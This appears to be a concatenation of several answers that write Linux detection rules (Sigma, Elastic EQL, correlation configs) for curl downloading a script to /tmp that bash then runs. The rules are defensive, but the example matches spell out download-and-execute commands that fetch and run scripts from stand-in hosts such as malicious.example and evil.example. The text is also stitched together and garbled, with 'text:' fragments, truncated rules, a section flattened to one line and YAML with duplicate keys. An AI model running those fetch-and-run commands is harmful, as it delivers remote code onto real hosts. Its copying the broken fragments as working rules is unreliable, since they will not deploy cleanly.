   - The best alert occurs when `curl` creates `/tmp/payload.sh`, then `bash` executes `/tmp/payload.sh`.
   - If your SIEM supports extracting the target file path into a normalized field, group-by that field.
   - Example fields to group by:
     - `Hostname`
     - `file.path`
     - `TargetFilename`
     - `process.target.path`

3. **Consider /var/tmp as well**
   - `/var/tmp` is commonly used by malware and legitimate scripts.
   - To broaden detection, add:
     ```yaml
     - '/var/tmp/*.sh'
     ```
   - But this will increase false positives.

4. **Include other shell names carefully**
   - If you want to detect execution by `sh` or `dash`, add:
     ```yaml
     Image|endswith:
       - '/sh'
       - '/dash'
       - '/bash'
     ```
   - This may be noisier.

5. **Expected false positives**
   - Legitimate installers using:
     ```bash
     curl ... -o /tmp/install.sh && bash /tmp/install.sh
     ```
   - CI/CD runners writing temporary scripts
   - Container entrypoints
   - Patch/update agents
   - Administrative maintenance scripts

   Mitigate by allow-listing known enterprise automation paths, parent processes, script hashes, or trusted binaries.

  process.name IN (bash, /bin/bash, /usr/bin/bash)

  command_line matches (["']?/tmp/.*\.sh) OR parent process event chain references same file path.

text:
Below is a Linux-oriented detection rule for the **download-and-execute** pattern where `curl` writes/outputs a Bash script into `/tmp`, and `bash`, `sh`, or `dash` then executes a script from `/tmp`.

Because the detection requires **“followed by”**, a sequence or correlation rule is preferred over a single-event rule.

---

## Recommended: Elastic/EQL sequence rule

```eql
sequence by host.name with maxspan=5m
  [process where host.os.type == "linux"
    and event.action in ("exec", "process_start")
    and (
      process.name : "curl"
      or process.executable : ("*/usr/bin/curl", "*/bin/curl", "*/usr/local/bin/curl")
    )
    and process.command_line != null
    and process.command_line : /(?:\s|^)(?:-o|--output)[=\s]*\/tmp\/[^\s]+\.sh\b/]
  ]
  [process where host.os.type == "linux"
    and event.action in ("exec", "process_start")
    and (
      process.name in ("bash", "sh", "dash")
      or process.executable : ("*/bin/bash", "*/usr/bin/bash", "*/bin/sh", "*/usr/bin/sh", "*/bin/dash", "*/usr/bin/dash")
    )
    and (
      process.command_line != null
      and process.command_line : "*/tmp/*.sh*"
    )
    and (
      process.args != null
      and process.args : "*/tmp/*.sh*"
    )
  ]
```

### What this detects

- A `curl` process executes with output written to a Bash script under `/tmp`.
- Example patterns:
  - `curl -o /tmp/payload.sh http://malicious.example/payload.sh`
  - `curl --output /tmp/payload.sh http://malicious.example/payload.sh`
- Followed within 5 minutes by execution of a `.sh` file under `/tmp` using:
  - `bash /tmp/payload.sh`
  - `sh /tmp/payload.sh`
  - `dash /tmp/payload.sh`
  - `bash -c "source /tmp/payload.sh"`

---

## Sigma-style sequence rule

If your SIEM or Sigma backend supports sequence correlation, this can be expressed as:

```yaml
title: Malicious Download and Execute of Bash Script from /tmp via curl
id: 7f5c1b96-6f99-4a9b-8d3e-3d55d521f5a7
status: experimental
description: |
  Detects a curl process downloading or writing a Bash script into /tmp,
  followed by execution of that script by bash, sh, or dash.
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1105/
tags:
  - attack.execution
  - attack.command_and_scripting_interpreter
  - attack.t1059.004
  - attack.t1105
logsource:
  product: linux
  category: process_creation
detection:
  selection_curl_download:
    Image|endswith:
      - '/usr/bin/curl'
      - '/bin/curl'
      - '/usr/local/bin/curl'
    CommandLine|re: '(?:-o|--output)[=\s]*\/tmp\/[^\s]+\.sh\b'

  selection_bash_execution:
    Image|endswith:
      - '/bin/bash'
      - '/usr/bin/bash'
      - '/bin/sh'
      - '/usr/bin/sh'
      - '/bin/dash'
      - '/usr/bin/dash'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  timeframe: 5m

  condition: selection_curl_download then selection_bash_execution
```

> **Note:** The `then` syntax is supported by some sequence/correlation engines. If your Sigma backend does not support it, implement the rule as two temporal correlation rules:
>
> 1. Curl downloads/writes `.sh` file to `/tmp`
> 2. Bash/sh/dash executes `.sh` file from `/tmp`
> 3. Correlate both events by `host.name` or `host.id` within a 5-minute window.

---

## File-event based Sigma variant

If you have Sysmon-for-Linux or EDR file creation events, a more reliable version can be used because `curl` may write a file without always exposing the output filename in the process command line:

```yaml
title: curl Writes Bash Script to /tmp Followed by bash Execution
id: 53d79f08-7c57-4e81-a154-57d93f6d3965
status: experimental
description: |
  Detects curl creating or downloading a Bash script into /tmp, followed by
  bash/sh/dash execution of that script.
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1105/
tags:
  - attack.execution
  - attack.command_and_scripting_interpreter
  - attack.t1059.004
  - attack.t1105
logsource:
  product: linux
  category: file_event
detection:
  selection_curl_write:
    Image|endswith:
      - '/usr/bin/curl'
      - '/bin/curl'
      - '/usr/local/bin/curl'
    TargetFilename|startswith: '/tmp/'
    TargetFilename|endswith: '.sh'

  selection_bash_execute:
    Image|endswith:
      - '/bin/bash'
      - '/usr/bin/bash'
      - '/bin/sh'
      - '/usr/bin/sh'
      - '/bin/dash'
      - '/usr/bin/dash'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  timeframe: 5m

  condition: selection_curl_write then selection_bash_execute
```

---

## MITRE ATT&CK Mapping

This detects a common malware delivery pattern associated with:

- **T1059.004** – Command and Scripting Interpreter: Unix Shell
- **T1105** – Ingress Tool Transfer
- **T1036** – Masquerading, when malicious scripts are placed in writable temporary locations such as `/tmp`

---

## Tuning guidance

Common false-positive sources may include:

- Package manager post-install scripts
- Software updaters
- CI/CD agents
- Developer workflows that download and execute helper scripts from `/tmp`
- Admin tasks using `curl -o /tmp/tool.sh && bash /tmp/tool.sh`

Suggested environment-specific allowlisting:

```yaml
filter:
  ParentImage|endswith:
    - '/usr/bin/apt'
    - '/usr/bin/dpkg'
    - '/usr/bin/yum'
    - '/usr/bin/dnf'
    - '/usr/bin/rpm'
    - '/usr/bin/snap'
  ParentCommandLine|contains|all:
    - '/var/cache/'
    - '/usr/share/'
    - '/etc/'
```

But be careful: attackers can abuse legitimate software installers, so allowlisting should be based on known-good parent process trees and paths in your environment.

text:
Below is a portable Sigma 1.x sequence/correlation rule for Linux process-creation telemetry. It detects the classic pattern:

1. `curl` writes a Bash script into `/tmp`.
2. Shortly after, `bash` or `sh` executes a script from `/tmp`.

```yaml
title: Download-and-Execute Pattern - curl to /tmp Bash Script Followed by Bash Execution
id: d2d7c874-9b07-463e-9c3e-61f83b3d116c
status: experimental
description: |
  Detects when curl writes a Bash script into /tmp and, shortly after,
  bash/sh executes a script from /tmp. This pattern is consistent with
  malware or adversary tooling using a remote script downloader followed
  by local shell execution.

references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1071/001/

tags:
  - attack.execution
  - attack.command_and_control
  - attack.initial_access
  - attack.t1105
  - attack.t1059.004
  - attack.t1071.001

logsource:
  product: linux
  category: process_creation
  service: process

detection:
  selection_download:
    Image|endswith:
      - '/curl'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  selection_exec:
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  condition: selection_download or selection_exec

correlation:
  type: temporal
  description: |
    curl writes a Bash script to /tmp, followed by bash/sh executing a
    script from /tmp.
  steps:
    - event_id: curl_download_tmp_sh
      where: selection_download
      condition: selection_download

    - event_id: bash_execute_tmp_sh
      where: selection_exec
      condition: selection_exec

  timeframe: 2m
  groupby:
    - User
    - Computer
    - SessionId

fields:
  - Timestamp
  - Computer
  - User
  - SessionId
  - ProcessGuid
  - Image
  - CommandLine
  - ParentImage
  - ParentCommandLine
  - ProcessCwd

falsepositives:
  - Legitimate software installers downloading shell scripts into /tmp.
  - CI/CD pipelines, vendor tooling, or administrator maintenance scripts.
  - Docker, pip, snap, flatpak, or other package/installer bootstrap scripts.

level: medium
```

---

## If your platform does not support Sigma correlations

Implement this as two queries joined by user/host/session within a time window.

### Query A — curl downloaded a Bash script to `/tmp`

```sigma
Image|endswith: '/curl'
CommandLine|contains|all:
  - '/tmp/'
  - '.sh'
```

### Query B — bash/sh executed a script from `/tmp`

```sigma
Image|endswith:
  - '/bash'
  - '/sh'
CommandLine|contains|all:
  - '/tmp/'
  - '.sh'
```

### Join condition

Alert when Query B occurs after Query A within `2m` for the same host/user/session:

```text
B.User = A.User
AND B.Computer = A.Computer
AND B.SessionId = A.SessionId
AND B.Timestamp >= A.Timestamp
AND B.Timestamp <= A.Timestamp + 2 minutes
```

---

## Tuning notes

- The rule intentionally requires `/tmp/` and `.sh` to reduce noise.
- If scripts often lack a `.sh` extension, you can broaden the execution condition to:

```sigma
Image|endswith:
  - '/bash'
  - '/sh'
CommandLine|contains:
  - '/tmp/'
```

This increases coverage but may also increase false positives.

- If your EDR logs file writes or process access, a stronger version correlates:

```text
curl writes: /tmp/*.sh
followed by:
bash/sh reads or executes: /tmp/*.sh
```

- If `curl -O` downloads a script into the current working directory, and that directory is `/tmp`, you may need to include `ProcessCwd|startswith: '/tmp/'` where available.
- If `SessionId` is unavailable in your telemetry, remove it from `groupby`, but keep `Computer` and `User`.
- If you want strictly Bash execution rather than any POSIX shell, remove `/sh` from the execution condition.

falsepositives:

  - CI/CD pipelines or automation tools that curl scripts into /tmp and run them

level: medium
```

text:
Use a **temporal sequence/correlation rule** that fires only when a `curl` process writes/downloads a bash script into `/tmp`, then a `bash` process executes an artifact from `/tmp` within a short window.

Below are a **Sigma correlation rule** plus the two component Sigma rules needed for many SIEM/EDR/telemetry pipelines. If your platform supports native sequence rules, you can directly adapt the logic; an Elastic/EQL equivalent is included after the Sigma rules.

## Detection Summary

**Data source:** Process creation events, e.g. Sysmon Event ID 1, CrowdStrike, Elastic ECS, Sentinel, etc.  
**Pattern:**

1. `curl` saves/downloads a bash script into `/tmp`, commonly with:
   - `-o /tmp/file.sh`
   - `--output /tmp/file.sh`
   - `> /tmp/file.sh`
2. `bash` later executes a script from `/tmp`, commonly:
   - `/tmp/file.sh`
   - `bash /tmp/file.sh`
   - `source /tmp/file.sh`

**MITRE ATT&CK mapping:**

- `T1059.004` Command and Scripting Interpreter: Unix Shell
- `T1105` Ingress Tool Transfer
- Likely tactic: Execution / Command and Control / Defense Evasion

---

## Sigma Temporal Correlation Rule

```yaml
type: correlation
id: c6e53925-6136-4346-92f3-c57e3b7e9d32
title: Malicious Download-and-Execute via curl to /tmp Followed by bash
description: >
  Detects an ordered temporal pattern where curl downloads or writes a bash
  script into /tmp and bash subsequently executes a script from /tmp. This
  behavior is common for download-and-execute malware or malicious shell-script
  delivery.
status: experimental
references:
  - MITRE ATT&CK: Command and Scripting Interpreter: Unix Shell, T1059.004
  - MITRE ATT&CK: Ingress Tool Transfer, T1105
tags:
  - attack.command_and_control
  - attack.execution
  - attack.t1059.004
  - attack.t1105
author: Detection Engineer
date: 2026-06-15

rule:
  type: sequence
  timestamp: EventTime
  events:
    - rule: d0a1c11d-91f4-4f2f-9d07-91d5d9310a11
      name: download
    - rule: e94d1d7e-2731-4f4b-9b19-95b1f93d7f11
      name: execute
  condition: download and execute
  groupby:
    - host.name
    - user.id
  timespan: 15m
```

> Note: Some SIEM/EDR implementations require rule IDs rather than names. Replace the IDs above with the actual IDs of your deployed component rules. If your correlation engine supports ordering explicitly, ensure `download` occurs before `execute`.

---

## Component Sigma Rule: Download Bash Script to /tmp via curl

```yaml
title: Suspicious Download of Bash Script to /tmp via curl
id: d0a1c11d-91f4-4f2f-9d07-91d5d9310a11
description: >
  Detects curl writing or saving a bash script into /tmp. Intended to be used
  as the first event in a download-and-execute correlation rule.
status: experimental
references:
  - MITRE ATT&CK: Command and Scripting Interpreter: Unix Shell, T1059.004
  - MITRE ATT&CK: Ingress Tool Transfer, T1105
tags:
  - attack.command_and_control
  - attack.execution
  - attack.t1059.004
  - attack.t1105
author: Detection Engineer
date: 2026-06-15

logsource:
  product: linux
  service: sysmon
  category: process_creation

detection:
  selection:
    EventID: 1
    Image|endswith:
      - '/usr/bin/curl'
      - '/bin/curl'
      - '/usr/local/bin/curl'
      - '/snap/bin/curl'

  output_to_tmp:
    CommandLine|contains|any:
      - '-o /tmp/'
      - '-o="/tmp/'
      - '-o "/tmp/'
      - '-O /tmp/'
      - '-O="/tmp/'
      - '--output /tmp/'
      - '--output="/tmp/'
      - '> /tmp/'
      - '>"/tmp/'
      - ">'/tmp/"

  script_hint:
    CommandLine|contains|any:
      - '.sh'
      - '.bash'

  false_positive_filter:
    CommandLine|contains|any:
      - '/tmp/systemd-private-'
      - '/tmp/.X11-unix'
      - '/tmp/snap.'
      - '/tmp/VSCode'
      - '/tmp/.font-unix'

  condition: selection and output_to_tmp and script_hint and not false_positive_filter

falsepositives:
  - Legitimate software installers, bootstrap agents, update managers, or CI/CD jobs downloading shell scripts to /tmp.

level: high
```

---

## Component Sigma Rule: Execution of Bash Script from /tmp

```yaml
title: Execution of Bash Script from /tmp
id: e94d1d7e-2731-4f4b-9b19-95b1f93d7f11
description: >
  Detects bash executing an artifact from /tmp. Intended to be used as the
  second event in a download-and-execute correlation rule.
status: experimental
references:
  - MITRE ATT&CK: Command and Scripting Interpreter: Unix Shell, T1059.004
  - MITRE ATT&CK: Ingress Tool Transfer, T1105
tags:
  - attack.command_and_control
  - attack.execution
  - attack.t1059.004
  - attack.t1105
author: Detection Engineer
date: 2026-06-15

logsource:
  product: linux
  service: sysmon
  category: process_creation

detection:
  selection:
    EventID: 1
    Image|endswith:
      - '/bin/bash'
      - '/usr/bin/bash'
      - '/usr/local/bin/bash'
      - '/opt/homebrew/bin/bash'

  tmp_path:
    CommandLine|contains|any:
      - '/tmp/'

  script_execution:
    CommandLine|contains|any:
      - '.sh'
      - '.bash'
      - 'source /tmp/'
      - 'source "/tmp/'
      - "source '/tmp/"
      - 'bash /tmp/'
      - 'bash "/tmp/'
      - "bash '/tmp/"

  false_positive_filter:
    CommandLine|contains|any:
      - '-c "cd /tmp'
      - '-c cd /tmp'
      - '-c "ls /tmp'
      - '-c ls /tmp'
      - '-c "rm /tmp'
      - '-c rm /tmp'
      - '/tmp/systemd-private-'
      - '/tmp/.X11-unix'
      - '/tmp/snap.'

  condition: selection and tmp_path and script_execution and not false_positive_filter

falsepositives:
  - Administrative scripts stored under /tmp.
  - Update or maintenance scripts executed from /tmp by trusted services.

level: high
```

---

## Elastic EQL Equivalent

If your environment supports EQL and you need a single sequence rule, this captures the same ordered behavior. Adapt field names to your ECS mapping.

```eq
sequence by host.name with maxspan=15m
  [process where event.action == "start"
    and process.name == "curl"
    and (
      command_line == "* -o /tmp/*.sh*"
      or command_line == "* -o \"/tmp/*.sh*"
      or command_line == "* --output /tmp/*.sh*"
      or command_line == "* --output=\"/tmp/*.sh*"
      or command_line == "* > /tmp/*.sh*"
    )
  ]
  [process where event.action == "start"
    and process.name == "bash"
    and (
      command_line == "/tmp/*.sh*"
      or command_line == "* /tmp/*.sh*"
      or command_line == "*bash /tmp/*.sh*"
      or command_line == "*source /tmp/*.sh*"
    )
  ]
```

A slightly less noisy version can use regex if available:

```eq
sequence by host.name with maxspan=15m
  [process where event.action == "start"
    and process.name == "curl"
    and command_line ~= """(-o|--output)\\s+/tmp/\\S+\\.sh"""
  ]
  [process where event.action == "start"
    and process.name == "bash"
    and command_line ~= """/tmp/\\S+\\.sh"""
  ]
```

---

## Tuning Recommendations

1. **Correlate by host and user first.**  
   The rule should require both events to occur on the same host and ideally the same user. Without `user` or `host` constraints, you may get noisy or unrelated matches.

2. **Reduce false positives by correlating the exact script path if supported.**  
   If your SIEM/EDR supports field-level correlation, extract the `/tmp/<name>.sh` path from both command lines and require the same path. That significantly improves precision.

3. **Shorten the time window for automation.**  
   For most malware and shell commands, `5m` is sufficient. For human-driven operations or slow staging, use `15m` to `30m`.

4. **Consider adding `/var/tmp`.**  
   Attackers often use `/var/tmp` as an alternative persistent temporary location. If you want broader coverage, include `/var/tmp/` in the same patterns.

5. **Watch for legitimate update mechanisms.**  
   Package managers, installer scripts, CI runners, and cloud-init may download scripts to `/tmp`. Add exclusions only if they are consistently observed in your environment.

## Recommended Detection Rule: Malicious Download-and-Execute via `curl` to `/tmp` Followed by `bash` This is a Linux-focused correlated/temporal detection rule. It detects classic malware delivery where a `curl` process downloads or writes a Bash script into `/tmp`, and then a `bash` process executes that script. --- # 1. High-Level Rule Logic ```text Rule Name: Malicious Download-and-Execute via curl to /tmp Followed by bash Execution Platform: Linux Severity: High MITRE ATT&CK: - T1059.004: Command and Scripting Interpreter: Unix Shell - T1105: Ingress Tool Transfer Condition: Event 1: A curl process downloads or creates a shell script under /tmp. Evidence can be: - A file write/create event: process image = *curl* file path = /tmp/*.sh - A process command line: process image = *curl* command line contains HTTP/HTTPS URL command line contains /tmp/ command line contains .sh command line contains -o /tmp/ OR --output /tmp/ OR > /tmp/ Event 2: A bash process executes a script under /tmp. Evidence: process image = *bash* command line contains /tmp/ and .sh Temporal relationship: Event 1 occurs before Event 2. Time window: 5 minutes or less. Same host required. File path match preferred; if path cannot be extracted, alert on same-host temporal sequence with reduced confidence. ``` --- # 2. Sigma Rule Set: Component Rules + Correlation Because many SIEMs do not support true sequence/correlation inside a single Sigma rule, the recommended implementation is: 1. A rule for `curl` downloading/creating `/tmp/*.sh` 2. A rule for `bash` executing `/tmp/*.sh` 3. A SIEM/EDR correlation rule that joins them by host and file path within a time window --- ## Rule A: `curl` Downloads or Creates Shell Script in `/tmp` ```yaml title: curl Downloads Shell Script to /tmp id: 9f6f3a73-9d21-48d0-83f1-1b5b1111d31c status: experimental description: | Detects curl downloading or creating shell scripts under /tmp. Uses file creation evidence when available, otherwise falls back to curl command-line patterns. author: Detection Engineering references: - https://attack.mitre.org/techniques/T1059/004/ - https://attack.mitre.org/techniques/T1105/ tags: - attack.command_and_scripting_interpreter - attack.t1059.004 - attack.ingress_tool_transfer - attack.t1105 logsource: category: '*' product: linux detection: curl_file_write: Image|endswith: '/curl' TargetFilename|startswith: '/tmp/' TargetFilename|endswith: '.sh' curl_commandline_download: Image|endswith: '/curl' CommandLine|contains|all: - '/tmp/' - '.sh' CommandLine|contains: - 'http://' - 'https://' curl_explicit_output_to_tmp: Image|endswith: '/curl' CommandLine|contains: - ' -o /tmp/' - '-o /tmp/' - ' --output /tmp/' - '--output /tmp/' - '> /tmp/' CommandLine|contains: - 'http://' - 'https://' CommandLine|contains: '.sh' condition: curl_file_write or curl_commandline_download or curl_explicit_output_to_tmp falsepositives: - Legitimate software installers downloading scripts to /tmp - CI/CD pipeline runners fetching helper scripts - Docker/podman entrypoint logic fetching update scripts - Package managers or application updaters using curl level: medium ``` ### Notes for Rule A The highest fidelity comes from combining process events with file creation events, such as Sysmon Event ID 11, EDR file writes, or `inotify`. Reason: a command such as: ```bash curl https://example.com/script.sh > /tmp/script.sh ``` may appear in telemetry as a file write by `curl` to `/tmp/script.sh`, even if the redirection is not visible in the `curl` process command line. Therefore, if available: ```text Process: curl File write: /tmp/*.sh ``` is the preferred signal. ## Detection Rule — Curl Download to `/tmp` Followed by Bash Execution

**Objective:** Detect a classic download-and-execute pattern where `curl` writes/downloads a Bash script under `/tmp`, and shortly afterward `bash` executes a script from `/tmp`.

### Assumptions
- Linux endpoint process telemetry is available.
- Events are normalized into ECS-style process fields:
  - `host.name`
  - `event.category = "process"`
  - `event.action = "start"`
  - `process.name`
  - `process.executable`
  - `process.command_line`
  - `process.args`
- We correlate process-start events on the same host within a short time window.

---

## Elastic EQL Correlation Rule

```eql
/**
 * Title:
 *   Download-and-Execute: curl Script to /tmp Followed by Bash Execution
 *
 * Description:
 *   Detects a curl process downloading or writing a Bash script to /tmp,
 *   followed by bash execution of a /tmp script within 60 seconds.
 *
 * MITRE ATT&CK:
 *   T1059.004 Command and Scripting Interpreter: Unix Shell
 *   T1105 Ingress Tool Transfer
 */
sequence by host.name
  with maxspan=60s

  // Event 1: curl downloads or writes a shell script into /tmp.
  [process where event.category == "process"
             and event.action == "start"
             and (
                   process.name == "curl"
                   or process.executable == "/usr/bin/curl"
                   or process.executable == "/bin/curl"
                   or process.executable == "/usr/local/bin/curl"
                 )
             and (
                   (
                     (
                       process.command_line == "*-o *"
                       or process.command_line == "*--output *"
                     )
                     and (
                       process.command_line == "*/tmp/*.sh*"
                       or process.command_line == "*-o /tmp/*.sh*"
                       or process.command_line == "*--output /tmp/*.sh*"
                     )
                   )
                   or
                   (
                     process.command_line == "*-O *"
                     and process.command_line == "*/tmp/*"
                     and process.command_line == "*.sh"
                   )
                 )
             and (
                   process.command_line == "*http*"
                   or process.command_line == "*https*"
                   or process.command_line == "*ftp*"
                   or process.command_line == "*sftp*"
                   or process.command_line == "*scp*"
                   or process.command_line == "*tftp*"
                   or process.command_line == "*://"
                 )
  ]

  // Event 2: bash executes a script located under /tmp.
  [process where event.category == "process"
             and event.action == "start"
             and (
                   process.name == "bash"
                   or process.name == "sh"
                   or process.executable == "/bin/bash"
                   or process.executable == "/usr/bin/bash"
                 )
             and (
                   process.command_line == "bash /tmp/*.sh*"
                   or process.command_line == "bash */tmp/*.sh*"
                   or process.command_line == "bash * /tmp/*.sh*"
                   or process.command_line == "bash -c * /tmp/*.sh*"
                   or process.command_line == "sh /tmp/*.sh*"
                   or process.command_line == "sh */tmp/*.sh*"
                   or process.command_line == "source */tmp/*.sh*"
                   or process.command_line == ". */tmp/*.sh*"
                   or process.args == "/tmp/*.sh"
                 )
             and not (
                   process.command_line == "bash -n * /tmp/*.sh*"
                   or process.command_line == "bash -n /tmp/*.sh*"
                   or process.command_line == "sh -n * /tmp/*.sh*"
                 )
  ]
```

---

## Rule Logic

A detection is triggered when both conditions occur in order:

### 1. `curl` downloads/writes a Bash script to `/tmp`

Examples of matching `curl` behavior:

```bash
curl -o /tmp/payload.sh http://malicious.example.com/payload.sh
```

```bash
curl --output /tmp/setup.sh https://update.example.com/setup.sh
```

```bash
curl -O http://malicious.example.com/install.sh
```

when executed from or writing to `/tmp`.

### 2. `bash` executes a script from `/tmp`

Examples of matching `bash` execution:

```bash
bash /tmp/payload.sh
```

```bash
bash /tmp/setup.sh
```

```bash
bash -c "/tmp/payload.sh"
```

```bash
source /tmp/payload.sh
```

```bash
. /tmp/payload.sh
```

The rule requires the `curl` event to occur before the `bash` event on the same host within **60 seconds**.

---

## Higher-Fidelity Variant: Match the Same Script Path

The EQL rule above detects the general pattern. To reduce false positives, correlate the exact `/tmp/*.sh` filename.

### Curl side regex

Extract the output path:

```regex
(?:-o|--output)(?:=|\s)['\"]?(/tmp/[^\s'\"]+\.sh)
```

### Bash side regex

Extract the executed script path:

```regex
(/tmp/[^\s'\"]+\.sh)
```

Then correlate on:

```text
host.name + script_path + event.action=process_start
```

with ordering:

```text
curl event timestamp < bash event timestamp <= curl timestamp + 60s
```

This confirms that the same script downloaded to `/tmp` was executed by `bash`.

---

## Suggested Tuning / Allowlisting

You may need exclusions if this rule generates false positives from legitimate installers, update agents, monitoring agents, or software deployment tools.

Common examples:

```text
process.parent.name: apt, dpkg, yum, dnf, zypper, puppet, ansible, systemd, docker, kubelet
```

```text
process.command_line: */usr/local/bin/...*/tmp/*.sh*
```

```text
process.command_line: *--version*
```

```text
process.command_line: *bash -n /tmp/*.sh*
```

For production use, prefer correlating the exact downloaded script path and limiting the sequence to processes with parent/child or same-user context if your telemetry supports it.

Below is a practical detection rule for Linux environments that have process-creation logging, such as Sysmon, EDR, auditd, or a SIEM ingesting process events.

Because download and execution are usually separate processes, this is best implemented as a **sequence/correlation rule**:

1. `curl` downloads content to `/tmp` or `/var/tmp` as a Bash script.
2. `bash` executes a script from `/tmp` or `/var/tmp`.
3. Both events occur on the same host within a short time window.

---

## Primary Detection Rule — Sequence / Correlation Logic

```yaml
# Rule: Malicious Download-and-Execute via curl to /tmp followed by bash
# Platform: Linux
# Log source: process_creation
# Type: sequence/correlation rule

title: "Malicious Download-and-Execute via curl to /tmp followed by bash"
description: >
  Detects a classic malware delivery pattern where curl downloads a Bash script
  into /tmp or /var/tmp and bash subsequently executes a script from that path.
  This pattern is commonly observed in download-and-execute malware, remote
  administration trojans, reverse shells, persistence mechanisms, and initial access
  scripts.

id: "2a6f1c7e-2a3f-4a86-9d4a-5c6717b5a3d9"
status: "experimental"
author: "Detection Engineering"
references:
  - "https://attack.mitre.org/techniques/T1105/"
  - "https://attack.mitre.org/techniques/T1059/004/"
tags:
  - attack.execution
  - attack.command-and-scripting-interpreter
  - attack.unix-shell
  - attack.t1059.004
  - attack.t1105

logsource:
  category: process_creation
  product: linux

detection:

  # Event 1: curl downloads a shell script into /tmp or /var/tmp.
  download_event:
    Image|endswith:
      - "/curl"
    CommandLine|contains:
      - "http://"
      - "https://"
    CommandLine|contains|all:
      - "/tmp/"
    CommandLine|contains:
      - " -o "
      - "-o "
      - "-o/"
      - " -O "
      - "--output "
      - "--output="
      - "--output-dir "
      - " > /tmp/"
    CommandLine|contains:
      - ".sh"
      - "bash "

  # Event 2: bash executes a shell script from /tmp or /var/tmp.
  execution_event:
    Image|endswith:
      - "/bash"
    CommandLine|contains|all:
      - "/tmp/"
      - ".sh"

  # Correlation logic:
  # execution_event must occur after download_event, on the same host/user,
  # within a short time window.
  sequence:
    first_event: "download_event"
    second_event: "execution_event"
    time_window: "30s"
    group_by:
      - Host
      - User
    optional_confidence_increase:
      # If the filename can be extracted from both command lines, require equality.
      # This reduces false positives.
      match_field: "script_path"
      extract_download_command:
        regex:
          - "(?:-o\\s+|/tmp/)([^\\s]+\\.sh)"
          - "--output(?:=|\\s+)([^\\s]+\\.sh)"
          - ">\\s*(/tmp/[^\\s]+\\.sh)"
      extract_execution_command:
        regex:
          - "\\s(/tmp/[^\\s]+\\.sh)"
          - "\\s(/var/tmp/[^\\s]+\\.sh)"
```

---

## Deployable Sigma Child Rules

Some SIEM/EDR platforms cannot enforce a sequence from a single Sigma rule. In those cases, deploy these two child rules and correlate them in the platform.

---

### Rule 1: curl Downloads Bash Script to /tmp

  Detects curl downloading content to /tmp or /var/tmp using an output flag and
  targeting or referencing a Bash script filename. This is often the first stage

status: "experimental"

## Correlation Configuration Example

If your platform supports sequence rules, configure the child rules above as:

```yaml
correlation:
  type: "sequence"
  rules:
    - id: "3f7b978c-84d4-4d9d-b429-5b93952b1555"   # curl downloads script to /tmp
    - id: "9c8111d8-855e-4263-a22c-135114d6c06c"   # bash executes script from /tmp
  time_window: "30s"
  group_by:
    - "Host"
    - "User"
  severity: "high"
```

For maximum confidence, also require that the script filename from the `curl` command matches the script filename executed by `bash`.

Example:

```text
curl -o /tmp/payload.sh https://evil.example/payload.sh
bash /tmp/payload.sh
```

This would produce:

```text
download_event script_path = /tmp/payload.sh
execution_event script_path = /tmp/payload.sh
```

If both paths match, the detection should be treated as higher confidence.

## Optional Single-Event Chain Rule

Some malware or attackers execute both steps in one parent command, such as:

```bash

## Tuning Recommendations

### Use the filename-match variant first

If your platform supports regex extraction or advanced correlation, prefer:

```text
curl -o /tmp/<name>.sh ...
bash /tmp/<name>.sh
```

Requiring the same filename to be present in both events dramatically reduces false positives.

### Expand execution shell if needed

If your environment commonly uses `sh` instead of `bash`, expand the execution rule:

```yaml
Image|endswith:
  - "/bash"
  - "/sh"
```

### Add file-content detection if available

Command-line-only detection can miss cases such as:

```bash
cd /tmp
curl -O http://evil.example/payload
chmod +x payload
./payload
```

If your EDR supports file-write detection, add a supporting rule:

```yaml
title: "curl Writes Shell Script to /tmp"
description: >
  Detects curl creating or writing a file to /tmp or /var/tmp with a shell-script
  extension. When followed by execution from the same path, this indicates
  download-and-execute malware delivery.
logsource:
  category: file_event
  product: linux
detection:
  selection:
    Image|endswith:
      - "/curl"
    TargetFilename|startswith:
      - "/tmp/"
      - "/var/tmp/"
    TargetFilename|endswith:
      - ".sh"
  condition: selection
level: "medium"
```

### Whitelist legitimate bootstrap behavior carefully

Legitimate software may do this, so create allowlists only for known-good:

```text
curl domains used by your organization
package-manager bootstrap scripts
known-good CI/CD paths
expected software update mechanisms
```

Do not globally whitelist `/tmp/*.sh` execution, because that will allow the same malicious behavior.

## Recommended Final Alerting Logic

For best signal-to-noise, alert on:

```text
High:
  curl download to /tmp/*.sh
  followed by bash execution of the same /tmp/*.sh file
  within 30 seconds

Medium:
  curl download to /tmp/*.sh
  followed by any bash execution of /tmp/*.sh
  within 30 seconds, without filename confirmation

Low:
  curl download to /tmp/*.sh by itself
```

A good production deployment would use the two child Sigma rules plus a correlation search in your SIEM, requiring:

```text
Host = Host
User = User
bash execution timestamp within 30 seconds after curl download timestamp
optional: script path/filename match
```

text:
Below is a portable, Sigma-style detection rule for **Linux process creation events**. It targets the common malware pattern where **`curl` writes a `.sh` script into `/tmp` and then `bash`/`sh` executes it**, either as a parent/child sequence or within a short time window.

Assumptions:

- Sysmon for Linux / EDR ProcessCreate events are available.
- Fields include:
  - `Image`
  - `ParentImage`
  - `CommandLine`
  - `Hostname` or host identifier
  - `User` / account context
- Tune field names to your log source.
- Recommended correlation window: **5 minutes**.

---

## Sigma-style Detection Rule

```yaml
title: Malicious Download-and-Execute via curl to /tmp Followed by bash Execution
id: 3a7d8d4f-7b0b-4c21-9e3c-2d1f6e9c5a3f
status: experimental
description: >
  Detects Linux malware delivery patterns where curl downloads a bash script
  into /tmp and bash/sh subsequently executes the script. This corresponds to
  classic download-and-execute techniques such as:
  curl -o /tmp/payload.sh http://malicious.com/payload.sh && bash /tmp/payload.sh
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059.004/
tags:
  - attack.execution
  - attack.command-and-control
  - attack.t1105
  - attack.t1059.004

logsource:
  product: linux
  service: process_creation
  category: process_creation

detection:
  # Step 1: curl downloads a bash script into /tmp
  selection_curl_download:
    Image|endswith:
      - '/curl'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'
    CommandLine|contains:
      - '-o '
